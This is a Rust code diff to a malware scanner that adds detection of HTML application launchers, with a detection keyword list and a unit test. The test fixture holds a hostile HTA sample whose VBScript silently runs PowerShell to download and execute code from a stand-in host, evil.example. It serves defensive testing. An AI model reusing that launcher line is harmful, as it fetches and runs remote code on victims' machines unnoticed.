@@ -756,6 +756,10 @@ fn is_probable_text(text: &str) -> bool {
 }
 
 fn identify_script_language(lower: &str) -> Option<ScriptLanguage> {
+    // An HTML application runs with the user's full rights, unlike a page in a browser.
+    if lower.contains("<hta:application") {
+        return Some(ScriptLanguage::Generic);
+    }
     if lower.starts_with("#!") {
         let first_line = lower.lines().next().unwrap_or_default();
         if first_line.contains("powershell") || first_line.contains("pwsh") {
@@ -1219,6 +1223,32 @@ fn analyze_script(bytes: &[u8], sample_limit: usize, evidence: &mut Vec<Evidence
     // code or a bundle that happens to mention a URL and an `eval`, and flagging that is how a
     // pnpm release came to look like malware.
     const NEARBY: usize = 600;
+
+    if lower.contains("<hta:application")
+        && (near(
+            &lower,
+            &["activexobject", "createobject", "wscript.shell"],
+            &[
+                "run(",
+                "exec(",
+                "powershell",
+                "cmd.exe",
+                "http://",
+                "https://",
+                "xmlhttp",
+            ],
+            NEARBY,
+        ))
+    {
+        push_evidence(
+            evidence,
+            "script.hta_launcher",
+            EvidenceSeverity::High,
+            45,
+            "HTML application creates a scripting object next to a command, download or run call"
+                .to_owned(),
+        );
+    }
 
     let has_long_encoded_payload =
         contains_any(&lower, &["powershell", "pwsh"]) && contains_long_base64_token(&text, 200);
@@ -2059,6 +2089,23 @@ mod tests {
             .evidence
             .iter()
             .any(|item| item.code == "pe.malformed"));
+    }
+
+    #[test]
+    fn html_applications_are_judged_by_what_they_run() {
+        let engine = ScanEngine::default();
+        let hostile = "<html><head><hta:application id=x showintaskbar=no>\n<script language=\"vbscript\">\nSet s = CreateObject(\"WScript.Shell\")\ns.Run \"powershell -w hidden -c iex(iwr https://evil.example/a)\", 0\n</script></head></html>";
+        let report = engine.scan_bytes(hostile.as_bytes());
+        assert!(matches!(report.content_type, ContentType::Script(_)));
+        assert!(report
+            .evidence
+            .iter()
+            .any(|item| item.code == "script.hta_launcher"));
+
+        let plain = "<html><head><hta:application id=x></head><body><p>Hello</p></body></html>";
+        let report = engine.scan_bytes(plain.as_bytes());
+        assert_eq!(report.verdict, Verdict::Clean);
+        assert!(report.evidence.is_empty());
     }
 
     #[test]
